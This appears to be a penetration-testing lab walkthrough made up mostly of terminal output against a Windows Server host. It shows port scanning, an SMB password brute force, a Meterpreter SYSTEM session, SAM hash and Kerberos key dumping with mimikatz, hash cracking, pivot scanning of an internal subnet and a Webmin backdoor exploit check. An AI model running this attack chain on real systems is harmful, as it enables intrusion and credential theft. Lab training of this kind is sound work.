## 192.168.100.55/winserver-03
```bash
Nmap scan report for ip-192-168-100-55.us-west-1.compute.internal (192.168.100.55)
Host is up (0.00041s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINSERVER-03
| Not valid before: 2026-01-27T20:59:48
|_Not valid after:  2026-07-29T20:59:48
|_ssl-date: 2026-01-29T01:10:02+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-03
|   NetBIOS_Domain_Name: WINSERVER-03
|   NetBIOS_Computer_Name: WINSERVER-03
|   DNS_Domain_Name: WINSERVER-03
|   DNS_Computer_Name: WINSERVER-03
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-29T01:09:54+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:50:7A:95:0D:21 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/29%OT=80%CT=1%CU=36897%PV=Y%DS=1%DC=D%G=Y%M=02507A%T
OS:M=697AB36B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WINSERVER-03, NetBIOS user: <unknown>, NetBIOS MAC: 02:50:7a:95:0d:21 (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: WINSERVER-03
|   NetBIOS computer name: WINSERVER-03\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-01-29T01:09:56+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-01-29T01:09:55
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms ip-192-168-100-55.us-west-1.compute.internal (192.168.100.55)

```
```bash
root@kali:~# hydra -l Administrator -P /usr/share/wordlists/rockyou.txt 192.168.100.55 smb
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-29 19:34:04
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.168.100.55:445/
[445][smb] host: 192.168.100.55   login: Administrator   password: swordfish
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-29 19:34:22
root@kali:~# 
```
```bash
meterpreter > sysinfo
Computer        : WINSERVER-03
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
```bash
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  8
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:50:7a:95:0d:21
MTU          : 9001
IPv4 Address : 192.168.100.55
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::51d4:9a7d:d9ea:adfa
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 27
============
Name         : AWS PV Network Device #2
Hardware MAC : 02:8d:47:b8:4e:c3
MTU          : 9001
IPv4 Address : 192.168.0.50
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::f906:f53b:aa3b:1ae5
IPv6 Netmask : ffff:ffff:ffff:ffff::
```
```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > lsa_sam_dump
[-] Unknown command: lsa_sam_dump
meterpreter > lsa_dump_sam 
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WINSERVER-03
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d
```
```bash
RID  : 000003f2 (1010)
User : mary
  Hash NTLM: 11637a16fca11b3604e3e68d5221b3c7

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ee979652bb73e3ee6c33d922d8751167

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEmary
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 63fe378d126a59690352759fabc9a0b0d33f358b8be01e11384e53c744364476
      aes128_hmac       (4096) : e476c63c7cbe031dc164e5edc88a8480
      des_cbc_md5       (4096) : 401c01c78926a192

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ATTACKDEFENSEmary
    Credentials
      des_cbc_md5       : 401c01c78926a192
```
```bash
root@kali:~# john --format=nt mary.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
hotmama          (?)     
1g 0:00:00:00 DONE (2026-01-29 19:50) 100.0g/s 192000p/s 192000c/s 192000C/s 2hot4u..hercules
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```
```bash
msf6 auxiliary(scanner/smb/smb_login) > set SMBPASS hotmama
SMBPASS => hotmama
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER mary
SMBUSER => mary
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 192.168.100.55:445    - 192.168.100.55:445 - Starting SMB login bruteforce
[+] 192.168.100.55:445    - 192.168.100.55:445 - Success: '.\mary:hotmama'
[!] 192.168.100.55:445    - No active DB -- Credential data will not be saved!
[*] 192.168.100.55:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```bash
C:\inetpub\wwwroot>type todo.txt
type todo.txt
Greetings gents!

I have setup this server to host our production services.
I will be sharing changelogs and updates on the HTTP File Server.

So far this server does not have any running services, as a result, you must login via RDP or SMB.

- Administrator
C:\inetpub\wwwroot>exit
exit
meterpreter > sysinfo
Computer        : WINSERVER-03
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > 
```
```bash
C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount           
Guest                    lawrence                 mary                     
student                  WDAGUtilityAccount       
The command completed with one or more errors.
```
```bash
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.0.50:         - 192.168.0.50:3389 - TCP OPEN
[+] 192.168.0.50:         - 192.168.0.50:80 - TCP OPEN
[*] 192.168.0.50:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.0.51
RHOSTS => 192.168.0.51
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.0.51:         - 192.168.0.51:22 - TCP OPEN
[+] 192.168.0.51:         - 192.168.0.51:80 - TCP OPEN
[+] 192.168.0.51:         - 192.168.0.51:10000 - TCP OPEN
[+] 192.168.0.51:         - 192.168.0.51:3389 - TCP OPEN
[*] 192.168.0.51:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.0.57
RHOSTS => 192.168.0.57
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.0.57:         - 192.168.0.57:22 - TCP OPEN
[*] 192.168.0.57:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.0.1
RHOSTS => 192.168.0.1
msf6 auxiliary(scanner/portscan/tcp) > run

[*] 192.168.0.1:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```bash
msf6 auxiliary(scanner/http/http_version) > services
Services
========

host            port   proto  name  state  info
----            ----   -----  ----  -----  ----
192.168.0.50    80     tcp    http  open   Microsoft-IIS/10.0
192.168.0.50    3389   tcp    rdp   open   Requires NLA: Yes
192.168.0.51    22     tcp    ssh   open   SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
192.168.0.51    80     tcp    http  open   Apache/2.4.41 (Ubuntu)
192.168.0.51    3389   tcp    rdp   open   Requires NLA: No
192.168.0.51    10000  tcp    http  open   MiniServ/1.920
192.168.0.57    22     tcp    ssh   open   SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7
```
```bash
msf6 exploit(linux/http/webmin_backdoor) > setg RHOSTS 192.168.0.51
RHOSTS => 192.168.0.51
msf6 exploit(linux/http/webmin_backdoor) > check
[+] 192.168.0.51:10000 - The target is vulnerable.
msf6 exploit(linux/http/webmin_backdoor) >
```